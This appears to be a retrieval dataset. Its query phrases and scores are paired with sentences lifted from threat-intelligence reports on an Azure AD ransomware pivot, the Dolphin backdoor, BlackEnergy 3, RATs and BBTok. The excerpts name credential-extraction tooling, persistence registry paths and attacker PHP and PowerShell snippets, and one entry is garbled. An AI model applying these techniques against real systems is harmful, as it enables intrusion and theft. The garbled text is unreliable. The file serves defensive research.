The first account was the compromised Azure AD Connector account,|0.754230434632428|['As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and 2/10cloud (Azure AD) environments.', 'The first account is the AD DS Connector Account.', 'The account name is prefixed with MSOL_ and it is created with a long complex password.', 'Figure 2.', 'Example of AD DS Connector account This accounts permissions are set based on features enabled during the services installation, but in most common scenarios, the account has permissions to replicate directory changes, modify passwords, modify users, modify groups, and so on (see all the permissions here).', 'In addition, during installation, an Azure AD account called the Azure AD Connector Account is also created.', 'This account is used by the synchronization service to manage Azure AD objects.', 'The account is created with a long complex password as well, and by default (if using the express settings) prefixed with Sync_[ServerName].', 'This user is assigned with the Directory Synchronization Accounts role (see detailed permissions of this role here).', 'In older versions, this account might be assigned with the Global Administrator role.', 'Figure 3.']
The first account was the compromised Azure AD Connector account,|0.7687586291948573|['Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.', 'We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.', 'The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.', 'Azure AD Connect is an on-premises application for managing hybrid identities through features like password hash synchronization, pass-through authentication, objects synchronization, and others.', 'As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and 2/10cloud (Azure AD) environments.', 'The first account is the AD DS Connector Account.', 'The account name is prefixed with MSOL_ and it is created with a long complex password.', 'Figure 2.', 'Example of AD DS Connector account This accounts permissions are set based on features enabled during the services installation, but in most common scenarios, the account has permissions to replicate directory changes, modify passwords, modify users, modify groups, and so on (see all the permissions here).', 'In addition, during installation, an Azure AD account called the Azure AD Connector Account is also created.', 'This account is used by the synchronization service to manage Azure AD objects.']
The first account was the compromised Azure AD Connector account,|0.754230434632428|['The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.Azure AD Connectis an on-premises application for managing hybrid identities through features likepassword hash synchronization,pass-through authentication,objects synchronization, and others.', 'As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and cloud (Azure AD) environments.', 'The first account is the AD DS Connector Account.', 'The account name is prefixed withMSOL_and it is created with a long complex password.Figure 2.', 'Example of AD DS Connector accountThis accounts permissions are set based on features enabled during the services installation, but in most common scenarios, the account has permissions to replicate directory changes, modify passwords, modify users, modify groups, and so on (see all the permissionshere).', 'In addition, during installation, an Azure AD account called the Azure AD Connector Account is also created.', 'This account is used by the synchronization service to manage Azure AD objects.', 'The account is created with a long complex password as well, and by default (if using the express settings) prefixed withSync_[ServerName].', 'This user is assigned with the Directory Synchronization Accounts role (see detailed permissions of this rolehere).', 'In older versions, this account might be assigned with the Global Administrator role.Figure 3.', 'Example of an Azure AD Connector accountThere are other entities detailedherethat are created but are less relevant to this topic.Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.']
The first account was the compromised Azure AD Connector account,|0.7687586291948573|['On-premises attack flowMoving from on-premises to cloudTo move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.', 'Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the AzureActiveDirectory (Azure AD) Connect agent is installed.', 'We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.', 'The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.Azure AD Connectis an on-premises application for managing hybrid identities through features likepassword hash synchronization,pass-through authentication,objects synchronization, and others.', 'As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and cloud (Azure AD) environments.', 'The first account is the AD DS Connector Account.', 'The account name is prefixed withMSOL_and it is created with a long complex password.Figure 2.', 'Example of AD DS Connector accountThis accounts permissions are set based on features enabled during the services installation, but in most common scenarios, the account has permissions to replicate directory changes, modify passwords, modify users, modify groups, and so on (see all the permissionshere).', 'In addition, during installation, an Azure AD account called the Azure AD Connector Account is also created.', 'This account is used by the synchronization service to manage Azure AD objects.', 'The account is created with a long complex password as well, and by default (if using the express settings) prefixed withSync_[ServerName].']
the threat actors were observed using compromised credentials to access the Azure AD Connect device.|0.7848533761617835|['The account is created with a long complex password as well, and by default (if using the express settings) prefixed with Sync_[ServerName].', 'This user is assigned with the Directory Synchronization Accounts role (see detailed permissions of this role here).', 'In older versions, this account might be assigned with the Global Administrator role.', 'Figure 3.', 'Example of an Azure AD Connector account There are other entities detailed here that are created but are less relevant to this topic.', 'Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.', 'Next, they set up an SSH tunnel to an attacker-controlled device.', 'On a separate attacker-controlled compromised device, evidence indicates cloning of the AADInternals tool.', 'One of the functions available in this tools library is Get-AADIntSyncCredentials, which allows any local administrator on a device where Azure AD Connect is installed to extract the plaintext credentials of both the Azure AD Connector account and the AD DS Connector account.', 'Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.', 'Investigating this sign-in showed that the threat actors were able to access the account on the first attempt without any guessing or modification of the password, indicating that the actors possessed the password for this account.']
authentication from a known attacker IP address into the Azure AD Connector cloud account.|0.8253671715418249|['Example of an Azure AD Connector account There are other entities detailed here that are created but are less relevant to this topic.', 'Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.', 'Next, they set up an SSH tunnel to an attacker-controlled device.', 'On a separate attacker-controlled compromised device, evidence indicates cloning of the AADInternals tool.', 'One of the functions available in this tools library is Get-AADIntSyncCredentials, which allows any local administrator on a device where Azure AD Connect is installed to extract the plaintext credentials of both the Azure AD Connector account and the AD DS Connector account.', 'Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.', 'Investigating this sign-in showed that the threat actors were able to access the account on the first attempt without any guessing or modification of the password, indicating that the actors possessed the password for this account.', 'The Azure AD Connector account is configured with single-factor authentication, making it easier for the attacker to gain entry and elevate privileges.', 'Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.', 'The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).', 'For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.']
the threat actors executed multiple actions in the cloud using two privileged accounts.|0.8025740322424528|['On a separate attacker-controlled compromised device, evidence indicates cloning of the AADInternals tool.', 'One of the functions available in this tools library is Get-AADIntSyncCredentials, which allows any local administrator on a device where Azure AD Connect is installed to extract the plaintext credentials of both the Azure AD Connector account and the AD DS Connector account.', 'Shortly before the ransomware deployment, we observed authentication from a known attacker IP address into the Azure AD Connector cloud account.', 'Investigating this sign-in showed that the threat actors were able to access the account on the first attempt without any guessing or modification of the password, indicating that the actors possessed the password for this account.', 'The Azure AD Connector account is configured with single-factor authentication, making it easier for the attacker to gain entry and elevate privileges.', 'Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.', 'The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).', 'For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.', 'Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.', 'Figure 4.', 'Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.']
The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.|1.0000000000000002|['Finally, the ransomware payload encrypted files found on the file system of the targeted devices by changing the file name extension to DARKBIT and dropped ransom notes.', 'Figure 1.', 'On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.', 'Two weeks before the ransomware deployment, the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.', 'We assess with high confidence that the threat actors then used the AADInternals tool to extract the plaintext credentials of a privileged Azure AD account.', 'The threat actors then used these credentials to pivot from the on-premises environment to the Azure AD environment.', 'Azure AD Connect is an on-premises application for managing hybrid identities through features like password hash synchronization, pass-through authentication, objects synchronization, and others.', 'As part of the express settings installation process, multiple accounts are created both in the on-premises (Windows Server Active Directory) and 2/10cloud (Azure AD) environments.', 'The first account is the AD DS Connector Account.', 'The account name is prefixed with MSOL_ and it is created with a long complex password.', 'Figure 2.']
the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.|0.8575839123600373|['Investigating this sign-in showed that the threat actors were able to access the account on the first attempt without any guessing or modification of the password, indicating that the actors possessed the password for this account.', 'The Azure AD Connector account is configured with single-factor authentication, making it easier for the attacker to gain entry and elevate privileges.', 'Cloud destructive impact On the day of the ransomware attack, the threat actors executed multiple actions in the cloud using two privileged accounts.', 'The first account was the compromised Azure AD Connector account, which had Global Administrator permissions as it was set up for an old solution (DirSync).', 'For the second account, which also had Global Administrator permissions, the threat actors leveraged RDP for access into the account.', 'Even though this account had MFA in place, the threat actors accessed it through RDP, which is an open session that evades MFA blocking their activities.', 'Figure 4.', 'Pivoting to the cloud Mass Azure resource deletion On the same day, a successful sign-in to the Microsoft Azure environment was observed.', 'The threat actors claimed the Global Administrator permission through Azure Privileged Identity Management (PIM) and elevated access to get permissions to the targets management groups and Azure subscriptions.', 'The Azure AD Connector account and the compromised administrator account were then used to perform significant destruction of the Azure environment deleting within a few hours server farms, virtual machines, storage accounts, and virtual networks.', 'We assess that the attackers goal was to cause data loss and a denial of service (DoS) of the targets services.']
This is done via the GetAsyncKeyState API, with keystrokes being logged|0.837959444563499|['Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.', 'In newer versions, this capability was finished and improved by adding extension filtering.', 'For unknown reasons, the command to retrieve specific files from portable devices was removed.', '4/8Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.', 'The defaults are chrome and internet explore (sic).', 'This is done via the GetAsyncKeyState API, with keystrokes being logged along with the window name and current time.', 'Screenshots are also taken at a configurable interval; the default is once every 30 seconds.', 'Screenshots and keylogging are enabled by default, and can be toggled via a command.', 'Shellcode Dolphin can receive shellcode for execution.', 'The shellcode is stored in the registry, under one of the following keys: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Classic\\\\<random_number> HKCU\\\\Software\\\\Microsoft\\\\OneDrive\\\\Update\\\\<random_number> HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\HttpsSoftware\\\\Microsoft\\\\Internet Explorer\\\\Zone\\\\<random_number> (two subkeys as one, likely a coding error) It can be executed either locally or in a specified separate process that is created and injected.', 'In the newer versions, the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphins startup, which was not the case in version 1.9 (the original version we analyzed).']
can log keystrokes.|0.8711213310810931|['properly restricted and assigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconnaissance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand access.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/application: Windows OS workstations, execution Windows domain controllers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/application: Discovered systems, including networked uninterruptable power Role in infrastructure: These systems support supply (UPS) devices, data center servers, business operations, manage permissions and a telephone communications server, and domain access, and provide remote network employee workstations access respectively.', 'Role in infrastructure: Internal reconnaissance Exploitation method: Threat actors use delivered efforts could potentially include all deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to access combination of valid user credentials and the domain controller, recover additional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged accounts.', 'network discovery.', 'VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote connections to workstations and servers.', 'enabling them to expand access across the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent access, and blend into regular systems deployed across the network, identify network traffic.', 'targets, and begin preparations for final attack.']
Screenshots are also taken at a configurable interval; the default is once every 30 seconds.|1.0000000000000002|['In newer versions, this capability was finished and improved by adding extension filtering.', 'For unknown reasons, the command to retrieve specific files from portable devices was removed.', '4/8Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.', 'The defaults are chrome and internet explore (sic).', 'This is done via the GetAsyncKeyState API, with keystrokes being logged along with the window name and current time.', 'Screenshots are also taken at a configurable interval; the default is once every 30 seconds.', 'Screenshots and keylogging are enabled by default, and can be toggled via a command.', 'Shellcode Dolphin can receive shellcode for execution.', 'The shellcode is stored in the registry, under one of the following keys: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Classic\\\\<random_number> HKCU\\\\Software\\\\Microsoft\\\\OneDrive\\\\Update\\\\<random_number> HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\HttpsSoftware\\\\Microsoft\\\\Internet Explorer\\\\Zone\\\\<random_number> (two subkeys as one, likely a coding error) It can be executed either locally or in a specified separate process that is created and injected.', 'In the newer versions, the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphins startup, which was not the case in version 1.9 (the original version we analyzed).', 'Shell commands Dolphin can execute shell commands; this is done via the popen API and their output is retrieved.']
can capture screenshots|0.9317766282185991|['Stop communications: Terminate communication session with the C2 until the next run.', 'Weve observed unimplemented Figure 14: Malicious VBScript used to persist MargulasRAT across reboots.', 'command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).']
can execute shell commands|0.9205958277061671|"['and deliver it to the victims by various means to gain an initial foothold, thereby downloading and implanting the Insekt RAT.""', '-Talos Persistence: Unknown Unfortunately a version of the Insekt RAT for macOS was not recovered.', 'As such, it is not known how (or if) persistence is achieved.', 'Capabilities: Backdoor/RAT As noted, a macOS version the Insekt RAT was not recovered nor seen in the wild.', 'However, in their report, Talos noted that the Windows / Linux variant supported the following features features that likely are implemented as well in the macOS variant: Sleep Take screenshotsUpgrade backdoor Retrieve file sizes Determine OS information Execute (shell?)', 'commands Execute (shell?)', 'commands as another user The report also notes that (the Window/Linux variants): ""the implant consists of other capabilities [as well] such as shellcode execution, port and IP scanning, SSH key manipulation, proxying connections, etc.""', '-Talos Also mentioned in the Talos report is a macOS tool (found in the open directory of the Alchimist server).', 'This tool contains a (limited) privilege escalation vulnerability as well as: ""The Mach-O file discovered in the open directory is a 64-bit executable written in GoLang embedded with an exploit and a bind shell backdoor.', ""The dropper contains an exploit for a privilege escalation vulnerability (CVE-2021-4034) in polkit's pkexec utility."", 'However, this utility is not installed on MacOSX by default, meaning the elevation of privileges is not guaranteed.']"
creates directory listings|0.7583351576599027|['This search can be extended to fixed drives (HDDs), via dedicated commands.', 'The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.', 'In the newer versions, the default search was extended to fixed drives.', 'The command to get specific files was improved, by caching/storing it in the configuration until completion.', 'Portable devices Among regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality appeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesnt exist on the victims computer Missing variable initialization some variables are assumed to be zero-initialized, or dereferenced as pointers without initialization Missing extension filtering The code is heavily based on Microsofts Portable Devices COM API code sample.', 'Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.', 'In newer versions, this capability was finished and improved by adding extension filtering.', 'For unknown reasons, the command to retrieve specific files from portable devices was removed.', '4/8Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.']
creates directory listings|0.7583351576599027|"['It communicates with Google Drive cloud storage, which is used as its C&C server.We named the backdoor Dolphin based on a PDB path found in the executable:D:\\\\Development\\\\BACKDOOR\\\\Dolphin\\\\x64\\\\Release\\\\Dolphin.pdbPersistenceThe backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\<random_run_name>\\\\""%appdata%\\\\Python27({32|64})\\\\pythonw.exe"" ""<loader_step_1>"" ""<loader_encrypted_step_2>""CapabilitiesThe following basic information about the computer and the backdoor is collected:Current backdoor configurationUsernameComputer nameLocal and external IP addressList of installed security productsRAM size and usageResult of check for debugger and other inspection tools (such as Wireshark)OS versionCurrent timeMalware versionDolphin downloads commands, issued by its operators, from Google Drive storage and executes them.', 'After execution, the output of commands is uploaded.', 'Most of Dolphins capabilities are controlled through commands.The most relevant capabilities are described below.File exfiltrationBy default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.', 'This search can be extended to fixed drives (HDDs), via dedicated commands.The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration:jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3Besides this automatic search, specific files can be exfiltrated.In the newer versions, the default search was extended to fixed drives.', 'The command to get specific files was improved, by caching/storing it in the configuration until completion.Portable devicesAmong regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality appeared to be under development in the first version we found, for several reasons:Relying on a hardcoded path with a username that likely doesnt exist on the victims computerMissing variable initialization some variables are assumed to be zero-initialized, or dereferenced as pointers without initializationMissing extension filteringThe code is heavily based on Microsofts Portable Devices COM APIcode sample.Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.In newer versions, this capability was finished and improved by adding extension filtering.', 'For unknown reasons, the command to retrieve specific files from portable devices was removed.Keylogging and screenshotsDolphin logs keystrokes for windows with titles containing substrings specified in its configuration.', 'The defaults arechromeandinternet explore(sic).', 'This is done via theGetAsyncKeyStateAPI, with keystrokes being logged along with the window name and current time.', 'Screenshots are also taken at a configurable interval; the default is once every 30 seconds.Screenshots and keylogging are enabled by default, and can be toggled via a command.ShellcodeDolphin can receive shellcode for execution.']"
It creates directory listings|0.78406401661736|['This search can be extended to fixed drives (HDDs), via dedicated commands.', 'The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.', 'In the newer versions, the default search was extended to fixed drives.', 'The command to get specific files was improved, by caching/storing it in the configuration until completion.', 'Portable devices Among regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality appeared to be under development in the first version we found, for several reasons: Relying on a hardcoded path with a username that likely doesnt exist on the victims computer Missing variable initialization some variables are assumed to be zero-initialized, or dereferenced as pointers without initialization Missing extension filtering The code is heavily based on Microsofts Portable Devices COM API code sample.', 'Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.', 'In newer versions, this capability was finished and improved by adding extension filtering.', 'For unknown reasons, the command to retrieve specific files from portable devices was removed.', '4/8Keylogging and screenshots Dolphin logs keystrokes for windows with titles containing substrings specified in its configuration.']
It creates directory listings|0.78406401661736|"['It communicates with Google Drive cloud storage, which is used as its C&C server.We named the backdoor Dolphin based on a PDB path found in the executable:D:\\\\Development\\\\BACKDOOR\\\\Dolphin\\\\x64\\\\Release\\\\Dolphin.pdbPersistenceThe backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\<random_run_name>\\\\""%appdata%\\\\Python27({32|64})\\\\pythonw.exe"" ""<loader_step_1>"" ""<loader_encrypted_step_2>""CapabilitiesThe following basic information about the computer and the backdoor is collected:Current backdoor configurationUsernameComputer nameLocal and external IP addressList of installed security productsRAM size and usageResult of check for debugger and other inspection tools (such as Wireshark)OS versionCurrent timeMalware versionDolphin downloads commands, issued by its operators, from Google Drive storage and executes them.', 'After execution, the output of commands is uploaded.', 'Most of Dolphins capabilities are controlled through commands.The most relevant capabilities are described below.File exfiltrationBy default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.', 'This search can be extended to fixed drives (HDDs), via dedicated commands.The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration:jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3Besides this automatic search, specific files can be exfiltrated.In the newer versions, the default search was extended to fixed drives.', 'The command to get specific files was improved, by caching/storing it in the configuration until completion.Portable devicesAmong regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality appeared to be under development in the first version we found, for several reasons:Relying on a hardcoded path with a username that likely doesnt exist on the victims computerMissing variable initialization some variables are assumed to be zero-initialized, or dereferenced as pointers without initializationMissing extension filteringThe code is heavily based on Microsofts Portable Devices COM APIcode sample.Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.In newer versions, this capability was finished and improved by adding extension filtering.', 'For unknown reasons, the command to retrieve specific files from portable devices was removed.Keylogging and screenshotsDolphin logs keystrokes for windows with titles containing substrings specified in its configuration.', 'The defaults arechromeandinternet explore(sic).', 'This is done via theGetAsyncKeyStateAPI, with keystrokes being logged along with the window name and current time.', 'Screenshots are also taken at a configurable interval; the default is once every 30 seconds.Screenshots and keylogging are enabled by default, and can be toggled via a command.ShellcodeDolphin can receive shellcode for execution.']"
OS version|0.7605058164028868|['before it actually handles any of the aforementioned functionalities, it must decrypt subsequent parts of itself.', 'The code is wrapped in 2 layers using simple crypters, so the first crypter decodes the second, and the latter decodes the actual loader code.', 'https://research.checkpoint.com/upsynergy/ 10/249/6/2019 UPSynergy: Chinese-American Spy vs. Spy Story - Check Point Research Figure 14: First and second phase of decoding the loaders payload.', 'After these phases are completed, the loader starts its operation which is broken down into the following steps: 1.', 'Dynamic function resolution.', '2.', 'Determine the OS version.', '3.', 'Locate the SrvTreeConnectList in sys.', '4.', 'Extract the encoded shellcode from a Transaction object list.']
OS version|0.79258930413642|['2 0 1 9.', '- 2 0 1 9.', '-18 2 0 1 9.  ,  2   ,        -,      .', '1    ,     -.', 'enti- tyTypeId   .', '.', '-     -,    .', 'JSON- -,    JSON.', '2 ,           ,    .', ',   .', 'JSON-  data   GetResult.']
OS version|0.79258930413642|"['When a victim clicks the link, it results in the download of either a ZIP archive or an ISO image, depending on the victims operating system.Although the process is seamless for the victim, the server generates a unique payload based on parameters found within the request.Figure 2 Server-side components used in BBTok infections.This process is carried out on a XAMPP-based server, and contains three essential components:A PowerShell script that handles payload preparation and contains the main bulk of the logic for creating lure archives.A PHP codebase and database designed to document and manage infections.Auxiliary utilities that enhance the functionality of these components.This is the chain of events:A victim performs an HTTP request to either/baixar,/descargaror/descarga(these paths suggest that the lures are in either Spanish or Portuguese).Based on the.htaccessfile, the server handles the request usingdescarga.php.The scripts utilize the filedb.phpto store information via an SQLite database about the request, including the victims fingerprint.Descarga.phpcallsps_gen.ps1to generate a custom archive, which is eventually delivered to the victim.Incoming Requests HandlingThe PHP codebase is composed of the following files:descarga/descargar.php Manages new connections and serves lure documents to the victims PC.db.php Generates and manages the SQLite database that includes the victims details.generator.php Utility class used to generate random links, strings, and other functionalities.Descarga and descargar translate to download in Spanish.', 'This file contains the main logic of the infection process.', 'The script itself contains many comments, some of them in plain Spanish and Portuguese, which provide hints as to the attackers origin.The script logic:It checks the geolocation of the link-referred victim against ip-api.com and stores it in a file.', 'If the victim isnt from a targeted country (i.e., Mexico or Brazil) the HTTP connection ends immediately with a 404 message.$api = new IpApi(); $whoAmI = $api->GetInfo($ip); $allowed = array(""MX"", ""BR""); file_put_contents(""ips/"".$ip.$whoAmI->countryCode, """"); if(!in_array($whoAmI->countryCode, $allowed)) {   http_response_code(404);   die(); }2.', 'If the victim passes the check, the script then parses the user agent to get the victims Windows OS version.$useragent = strtolower(htmlspecialchars($_SERVER[\'HTTP_USER_AGENT\'])); $match = false; $dfile = ""10""; $dfiles = array (   \'windows nt 10.0\' => \'10\',   \'windows nt 6.3\' => \'10\',   \'windows nt 6.2\' => \'10\',   \'windows nt 6.1\' => \'7\',   \'windows nt 6.0\' => \'7\',   \'windows nt 5.2\' => \'7\' ); foreach($dfiles as $os=>$file) {   if (preg_match(\'/\' .', '$os .', ""'/i', $useragent)) {     $match = true;     $dfile = $file;     break;    } }3."", 'It then passes the user agent with the victims country code and lure filename to the PowerShell payload generator script.PowerShell Payload GeneratorThe scriptps_gen.ps1contains the main logic for generating archive payloads, either as ZIP or ISO files.', 'The latest version of the code has a lot of commented-out sections that were likely functional in the past, which suggests they contain additional infection chains and lures.', 'We found multiple versions of the file, some dating back to July 2022, demonstrating that this operation has been ongoing for quite a while.Our analysis of the latest version is below.', 'For more details on earlier variations and changes to the script over time, see the section Earlier Versions.The generator script is called bydescarga.php, using the functionDownloadFilewith the argumentsfile_name,verandcc.These correspond to the generated archive name, the victims OS version and the victims country code.function DownloadFile($file_name, $ver, $cc) {   if($ver == ""10"" )   {     $ext = ""iso"";   } else {     $ext = ""zip"";   }   exec(\'powershell -ex Bypass -File ./ps_gen.ps1 \'.$file_name.\'']"
OS version|1.0|[')Preferred elevation technique (How is the token replacement performed?', ')Heap spraying technique (Using AcceleratorTables?', 'Windows?', 'Bitmaps?', ')FrameworkThe flow of the exploitsOption #1:Main exploit flow with almost no side-branchesOption #2:Multiple twists and knobs for different versions of the OSThe structure of the code and functions in itModularity:Separation to functionsStructure:Separation to clear phases (Init, config, spray, token swap, )Global Variables:What information is stored in global variables?', '(OS version?', 'OS version enum?', 'Just a specific field offset?', ')Version-specific configurations:Field offsets:What fields are of special interest?Preferred system calls:Preferred set of syscallsAPI provided to the customerFigure 2:The set of exploit-related artifacts that we will be looking for.With these properties in mind, we looked back at the two samples we had and marked some artifacts we thought were unique.', 'Even though we had only two small binaries (which were essentially the same) we were able to create hunting rules to find more samples written by this developer.', 'To our surprise, we were able to find more of them than we could have imagined.One after the other, dozens of samples started to appear, and with each one, we improved our hunting rules and methodologies.']
obtains various system information including OS version, computer name and RAM size.|0.7985681237103814|['Credentials from Password Stores: Dolphin can obtain saved passwords from Credential T1555.003 Credentials from Web Browsers browsers.', 'Access T1539 Steal Web Session Cookie Dolphin can obtain cookies from browsers.', 'T1010 Application Window Discovery Dolphin captures the title of the active window.', 'T1083 File and Directory Discovery Dolphin can obtain file and directory listings.', 'Software Discovery: Security Dolphin obtains a list of installed security T1518.001 Software Discovery software.', 'Dolphin obtains various system information T1082 System Information Discovery including OS version, computer name and RAM size.', 'Discovery System Network Configuration Dolphin obtains the devices local and external T1016 Discovery IP address.', 'System Network Configuration T1016.001Discovery: Internet Connection Dolphin checks internet connectivity.', 'Discovery T1033 System Owner/User Discovery Dolphin obtains the victims username.', 'T1124 System Time Discovery Dolphin obtains the victims current time.', 'T1056.001Input Capture: Keylogging Dolphin can log keystrokes.']
it creates a one-time scheduled task.|0.8742471549906861|['Pgina 7 de 11RESEARCH_ Docless Vietnam APT -A technique still alive- The code contains Bai.doc in base64, which is the decoy document.', 'And uses scheduled tasks to persist, checking if the victim has privileges.', 'This file checks if the user is administrator.', 'If so, it copies the DLL file in WINDIR\\\\debug\\\\ and %TEMP% otherwise.', 'If administrator, it will create a scheduled task with SYSTEM privileges, if not, it will try without so high privileges Aside, this file is in charge of persistence.', 'It creates a scheduled task.', 'It is quite interesting that the malware checks if Kaspersky (avp.exe process) is running in the system and acts differently if so.', 'If Kaspersky IS in the system, it will create a scheduled task that runs a vbs script, as usual.', 'But if Kaspersky is NOT present in the system, it will rename the vbs to TXT and run wbscript with the parameter /E:vbscript that allows the program to know what kind of script it is running.', 'We guess this is trying to bypass the detection tin some way, although it sounds counterintuitive.', 'The final stage, uninstalling yourself The system runs the DLL with InstallUtil.exe, to avoid Smartscreen and Applocker.']
